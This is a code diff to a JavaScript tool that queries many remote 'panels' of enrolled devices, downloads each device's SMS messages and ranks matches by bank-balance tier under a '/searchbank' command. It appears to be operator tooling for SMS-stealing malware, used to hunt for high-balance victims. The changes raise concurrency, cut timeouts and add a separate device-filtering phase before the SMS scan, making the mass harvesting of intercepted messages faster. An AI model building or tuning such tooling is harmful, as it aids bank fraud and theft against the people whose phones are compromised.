@@ -10,9 +10,9 @@ const TIERS = {
   user30_90L: { min: 30_000, max: 9_000_000, label: 'BAL 30K–90L', sort: 'desc' },
 };
 
-const SMS_LIMIT = { 1: 1200, 3: 1800, 7: 2200, 15: 2800, 30: 3200, 0: 4000 };
-const PANEL_PARALLEL = 16;
-const SMS_BATCH = 28;
+const SMS_LIMIT = { 1: 550, 3: 900, 7: 1200, 15: 1600, 30: 2000, 0: 2500 };
+const PANEL_PARALLEL = 88;
+const SMS_PARALLEL = 72;
 
 export function parseSearchCommand(text) {
   const raw = text.replace(/^\/searchbank\s*/i, '').replace(/^\/search\s*/i, '').trim();
@@ -82,7 +82,7 @@ async function fetchDeviceMessages(device, limit = 800) {
   });
   if (device.panelKey?.trim()) params.set('auth', device.panelKey.trim());
   const ctrl = new AbortController();
-  const timer = setTimeout(() => ctrl.abort(), 6500);
+  const timer = setTimeout(() => ctrl.abort(), 4000);
   try {
     const res = await fetch(`${base}/messages/${encodeURIComponent(device.id)}.json?${params}`, {
       signal: ctrl.signal,
@@ -204,10 +204,12 @@ export async function runSearch(panels, opts, onProgress) {
   const t0 = Date.now();
   const panelsHit = new Set();
   const results = [];
+  const candidates = [];
   const limit = smsLimitForDays(opts.days);
   let panelsDone = 0;
   let devicesSmsDone = 0;
 
+  // Phase 1 — 16k DB fast (clients only, filter ke hisaab se list)
   await mapPool(panels, PANEL_PARALLEL, async panel => {
     let devices = [];
     try {
@@ -216,20 +218,30 @@ export async function runSearch(panels, opts, onProgress) {
       devices = [];
     }
     panelsDone++;
-
     if (devices.length) panelsHit.add(panel.url.toLowerCase());
-
-    const toScan = devices.filter(d => devicePassesStatus(d, opts) && devicePassesPin(d, opts));
-
-    for (let k = 0; k < toScan.length; k += SMS_BATCH) {
-      const smsChunk = toScan.slice(k, k + SMS_BATCH);
-      await Promise.all(smsChunk.map(d => scanDeviceSms(d, opts, tier, limit, results)));
-      devicesSmsDone += smsChunk.length;
+    for (const d of devices) {
+      if (devicePassesStatus(d, opts) && devicePassesPin(d, opts)) {
+        candidates.push(d);
+      }
     }
-
-    if (panelsDone % 20 === 0 || panelsDone === panels.length) {
+    if (panelsDone % 45 === 0 || panelsDone === panels.length) {
       onProgress?.({
-        phase: 'run',
+        phase: 'db',
+        panelsDone,
+        panelsTotal: panels.length,
+        devices: candidates.length,
+        matched: results.length,
+      });
+    }
+  });
+
+  // Phase 2 — SMS (sirf filtered devices)
+  await mapPool(candidates, SMS_PARALLEL, async d => {
+    await scanDeviceSms(d, opts, tier, limit, results);
+    devicesSmsDone++;
+    if (devicesSmsDone % 80 === 0 || devicesSmsDone === candidates.length) {
+      onProgress?.({
+        phase: 'sms',
         panelsDone,
         panelsTotal: panels.length,
         devices: devicesSmsDone,
